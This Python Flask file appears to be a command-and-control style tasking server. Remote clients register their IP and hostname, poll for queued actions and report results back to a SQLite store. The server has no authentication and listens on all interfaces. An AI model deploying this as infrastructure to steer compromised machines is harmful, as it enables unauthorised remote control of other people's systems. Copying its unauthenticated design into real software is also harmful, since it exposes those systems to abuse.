from flask import Flask, request, jsonify
import sqlite3
import json
from datetime import datetime
import os

app = Flask(__name__)
DB_PATH = "tasks.db"


def now_iso():
    return datetime.utcnow().isoformat() + "Z"


def init_db():
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute("""
        CREATE TABLE IF NOT EXISTS tasks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            client_id TEXT,
            action TEXT NOT NULL,
            args TEXT,
            status TEXT NOT NULL DEFAULT 'pending',
            output_json TEXT,
            created_at TEXT NOT NULL,
            completed_at TEXT
        )
        """)
        conn.execute("""
        CREATE TABLE IF NOT EXISTS clients (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            client_id TEXT UNIQUE NOT NULL,
            ip TEXT,
            hostname TEXT,
            broker TEXT,
            last_seen TEXT NOT NULL
        )
        """)
        conn.commit()


@app.route("/checkin", methods=["POST"])
def checkin():
    payload = request.get_json()
    if payload == None:
        return

    # Handle client registration
    if payload.get("command") == "register":
        client_id = payload["clientID"]
        ip = payload.get("ip")
        hostname = payload.get("hostname")
        broker = payload.get("broker")
        now = now_iso()

        with sqlite3.connect(DB_PATH) as conn:
            conn.execute("""
                INSERT INTO clients (client_id, ip, hostname, broker, last_seen)
                VALUES (?, ?, ?, ?, ?)
                ON CONFLICT(client_id)
                DO UPDATE SET ip=excluded.ip,
                              hostname=excluded.hostname,
                              broker=excluded.broker,
                              last_seen=excluded.last_seen
            """, (client_id, ip, hostname, broker, now))
            conn.commit()

        print(f"🟢 New client registered: {client_id} ({hostname} @ {ip}) via {broker}")

        return jsonify({
            "clientID": client_id,
            "command": "",
            "commandID": None,
            "args": None,
            "output": "success"
        })

    # Handle report of task output
    if payload.get("command") == "report":
        command_id = payload.get("commandID")
        output = payload.get("output")
        status = payload.get("status", "done")

        with sqlite3.connect(DB_PATH) as conn:
            conn.execute("""
                UPDATE tasks
                SET output_json=?, status=?, completed_at=?
                WHERE id=?
            """, (json.dumps(output), status, now_iso(), command_id))
            conn.commit()

        return jsonify({"ok": True})

    # Otherwise: check for pending tasks
    client_id = payload.get("clientID")
    with sqlite3.connect(DB_PATH) as conn:
        cur = conn.execute("""
            SELECT id, action, args FROM tasks
            WHERE status='pending' AND (client_id IS NULL OR client_id=?)
            ORDER BY id ASC LIMIT 1
        """, (client_id,))
        row = cur.fetchone()

    if row:
        task_id, action, args = row
        return jsonify({
            "clientID": client_id,
            "command": action,
            "commandID": str(task_id),
            "args": args
        })
    else:
        return jsonify({
            "clientID": client_id,
            "command": "",
            "commandID": None,
            "args": None
        })


if __name__ == "__main__":
    if not os.path.exists(DB_PATH):
        init_db()
    print("🚀 Server listening on http://0.0.0.0:8000")
    app.run(host="0.0.0.0", port=8000)
